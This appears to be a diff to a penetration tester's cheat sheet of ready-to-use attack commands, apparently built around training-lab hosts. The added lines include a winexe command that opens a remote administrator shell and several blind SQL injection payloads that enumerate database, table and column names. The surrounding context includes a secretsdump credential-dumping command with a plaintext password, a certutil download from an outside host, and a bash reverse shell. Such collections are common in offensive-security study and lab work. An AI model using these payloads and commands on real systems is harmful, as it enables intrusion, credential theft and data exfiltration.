@@ -100,6 +100,9 @@ secretsdump.py THROWBACK.local/jeffersd:Throwback2020@10.200.3.117 -dc-ip 10.200
 [xfreerdp]
 xfreerdp /v:10.10.10.10 /u:admin /p:password
 
+[winexe]
+winexe -U 'administrator' //10.10.10.10 'cmd.exe'
+
 [certuril]
 certutil -URLCache -f http://10.8.2.121:9005/setup.msi  c:\Temp\setup.msi
 
@@ -180,6 +183,13 @@ select load_file('/tmp/data.blob')
 [mysql: user defined function]
 https://redteamnation.com/mysql-user-defined-functions/
 https://www.facebook.com/watch/?v=2060455820930493
+
+[mysql: boolean]
+' or length(database())='2'-- -
+' or substring(database(), 2,1)="a"-- -
+' or substring(database()) like "%a%'-- -
+' or substring(select table_name from information_schema.tables where table_schema=database(), 1, 1) = "a"-- -
+' or substring(select table_column from information_schema.columns where table_schema=database() and table_name='users' 1, 1) = "a"-- -
 
 [ldap: dse namingcontexts search]
 ldapsearch -h 172.31.3.9 -x -s base namingcontexts
@@ -379,6 +389,9 @@ bash -i >& /dev/udp/127.0.0.1/4242 0>&1
 3. 0 or database() like '%a%'
 3.1 0 or database() like 'a%'
 3.2 0 or databasE() like 'd__k'
+' or (select (ascii(substr((select database()), 1, 1))) = 104)-- -
+' or (select (ascii(substr((select table_name from information_schema.tables where table_schema=database()), 1, 1))) = 104)-- -
+' or (select (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='user'), 1, 1))) = 104)-- -
 
 [sql read and write]
 SELECT * FROM mytable INTO dumpfile '/tmp/somefile'
